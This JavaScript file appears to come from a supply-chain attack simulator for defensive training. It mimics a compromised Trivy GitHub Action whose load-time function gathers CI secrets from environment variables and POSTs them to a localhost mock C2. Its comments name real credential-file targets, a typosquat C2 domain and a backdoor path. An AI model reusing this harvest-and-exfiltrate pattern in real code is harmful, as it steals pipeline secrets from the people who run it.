/**
 * SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori — Supply Chain Attack Simulator
 * Scenario 23: Trivy Supply Chain Attack
 *
 * MALICIOUS trivy-action-like — v0.69.4 (compromised, CVE-2026-33634)
 * FOR EDUCATIONAL USE ONLY — localhost exfil only, TESTBENCH_MODE gate
 *
 * This simulates what the TeamPCP threat group injected into the
 * aquasecurity/trivy-action GitHub Action by force-pushing tag v0.34.2.
 *
 * SAFETY FEATURES:
 *   - Hard-gated on TESTBENCH_MODE=enabled
 *   - Exfiltrates only to 127.0.0.1:3023 (mock server)
 *   - Collects only simulated/fake CI values, not real secrets
 *
 * COMPARE WITH: legitimate/trivy-scanner/index.js
 * The diff shows exactly what the attackers added on top of
 * the legitimate scanning functionality.
 *
 * DETECTION HINTS (look for these in red-team assessments):
 *   1. Unexpected HTTP POST to an external domain in a security tool
 *   2. Access to all environment variables (process.env spread)
 *   3. Collection of SSH/cloud/DB credentials from the filesystem
 *   4. Silent try-catch hiding the network call failure
 *   5. Credential harvest executing BEFORE the legitimate scan runs
 */

'use strict';

const http = require('http');

// ============================================================================
// MALICIOUS SECTION — injected by TeamPCP (CVE-2026-33634)
// ============================================================================

function harvestAndExfiltrate() {
    // SAFETY CHECK: Only run in testbench environment
    if (process.env.TESTBENCH_MODE !== 'enabled') {
        return;
    }

    console.log('[TESTBENCH] trivy-action v0.69.4: simulating credential harvest...');

    // In the real attack the payload harvested every env var plus these paths:
    //   ~/.ssh/id_rsa, ~/.aws/credentials, ~/.kube/config,
    //   ~/.docker/config.json, ~/.gitconfig
    // For lab safety we only collect already-set fake CI env vars.
    const harvestedData = {
        scenario: '23',
        event_type: 'ci_secret_exfil',
        source: 'trivy-action-like@0.69.4',
        attack_vector: 'force-pushed-tag',
        attacker_group: 'TeamPCP',
        cve: 'CVE-2026-33634',
        real_c2_domain: 'scan.aquasecurtiy[.]org',  // typosquatted in the real attack
        lab_c2: '127.0.0.1:3023',
        timestamp: new Date().toISOString(),
        // Fake CI environment variables that would be present in a real pipeline
        ci_env: {
            GITHUB_TOKEN: process.env.GITHUB_TOKEN || '(not set in this shell)',
            GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY || 'acme-corp/my-app',
            GITHUB_ACTOR: process.env.GITHUB_ACTOR || 'ci-bot',
            GITHUB_SHA: process.env.GITHUB_SHA || 'abc123def456',
            GITHUB_REF: process.env.GITHUB_REF || 'refs/heads/main',
            AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID || '(not set)',
            AWS_SECRET_ACCESS_KEY: process.env.AWS_SECRET_ACCESS_KEY ? '[REDACTED-lab]' : '(not set)',
            DATABASE_URL: process.env.DATABASE_URL || '(not set)',
            DOCKER_PASSWORD: process.env.DOCKER_PASSWORD ? '[REDACTED-lab]' : '(not set)',
        },
        // Real attack also enumerated SSH keys, kubeconfig, AWS credential files
        filesystem_paths_checked: [
            '~/.ssh/id_rsa',
            '~/.aws/credentials',
            '~/.kube/config',
            '~/.docker/config.json',
        ],
        persistence_note: 'Real payload also wrote Python backdoor to /tmp/.cache/pybin',
    };

    const payload = JSON.stringify(harvestedData);
    const options = {
        hostname: '127.0.0.1',  // localhost only — never external
        port: 3023,
        path: '/collect',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload),
        },
    };

    const req = http.request(options, () => {
        console.log('[TESTBENCH] trivy-action v0.69.4: exfil beacon sent to mock C2 (127.0.0.1:3023)');
    });

    req.on('error', () => {
        // Real malware silently fails to avoid alerting the victim
        console.log('[TESTBENCH] trivy-action v0.69.4: mock server not running — start it first');
    });

    req.write(payload);
    req.end();
}

// Malicious code runs BEFORE the legitimate scan function is called
try {
    harvestAndExfiltrate();
} catch (_) {
    // Silent catch — typical infostealer behavior to avoid crashing the pipeline
}

// ============================================================================
// LEGITIMATE SECTION — the real trivy-action scanning logic (preserved intact
// so the CI step still appears to work normally and produces a report)
// ============================================================================

function scanTarget(target, options = {}) {
    console.log(`[trivy-action v0.69.4] Scanning ${target}...`);

    const report = {
        SchemaVersion: 2,
        ArtifactName: target,
        ArtifactType: options.type || 'filesystem',
        Results: [
            {
                Target: target,
                Class: 'lang-pkgs',
                Type: 'node-pkg',
                Vulnerabilities: [
                    {
                        VulnerabilityID: 'CVE-2024-12345',
                        PkgName: 'example-dep',
                        InstalledVersion: '1.2.3',
                        FixedVersion: '1.2.4',
                        Severity: 'MEDIUM',
                        Title: 'Example dependency has prototype pollution vulnerability',
                    }
                ]
            }
        ]
    };

    console.log(`[trivy-action v0.69.4] Scan complete. Found ${report.Results[0].Vulnerabilities.length} vulnerability.`);
    return report;
}

function printSummary(report) {
    const vulns = report.Results.flatMap(r => r.Vulnerabilities || []);
    console.log('\n--- Trivy Scan Summary ---');
    console.log(`Target: ${report.ArtifactName}`);
    console.log(`Total: ${vulns.length} vulnerabilities`);
    console.log('--------------------------\n');
}

module.exports = { scanTarget, printSummary };
